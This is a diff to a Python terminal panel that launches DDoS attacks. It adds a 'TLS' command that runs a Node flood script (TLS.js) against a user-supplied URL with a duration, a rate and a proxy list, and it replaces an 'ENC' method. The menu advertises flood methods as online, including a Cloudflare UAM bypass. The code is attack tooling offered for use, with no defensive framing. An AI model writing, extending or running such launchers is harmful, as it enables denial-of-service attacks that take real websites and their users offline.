@@ -292,7 +292,7 @@ def vip():
                     ╔═══╩════════════════════════════════════════════════╩═══╗
                     ║    ●  BOW        [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  FLOOD      [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
                     ║    ●  HTTP-LOAD  [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  TLS-FLOOD  [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
-                    ║    ●  ENC        [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  UAM-CFL    [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
+                    ║    ●  TLS        [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  UAM-CFL    [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
 
@@ -488,6 +488,18 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBOW <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBOW https://example.com 120')
 
+                elif sinput == "TLS" or sinput == "tls":
+                        try:
+                                url = sin.split()[1]
+                                time = sin.split()[2]
+                                rate = sin.split()[3]
+                                Screen.wrapper(attack)
+                                os.system ("clear")
+                                os.system(f'cd VIP && node TLS.js {url} {time} {rate} 10 proxy.txt')  
+                        except (ValueError, IndexError):
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTLS <url> <time> <rate>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBOW https://example.com 120 64')
+                
                 elif sinput == "BROWSER" or sinput == "browser":
                         try:
                                 url = sin.split()[1]
@@ -660,17 +672,6 @@ def main():
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mUAMCFL <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mUAMCFL https://example.com 120')
-
-                elif sinput == "ENC" or sinput == "enc":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                rate = sin.split()[3]
-                                Screen.wrapper(attack)
-                                os.system(f'cd VIP && node ENC.js {url} {time} {rate} 10 proxy.txt')
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mENC <url> <time> <rate>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mENC https://example.com 120 64')
 
                 else:
                         try:
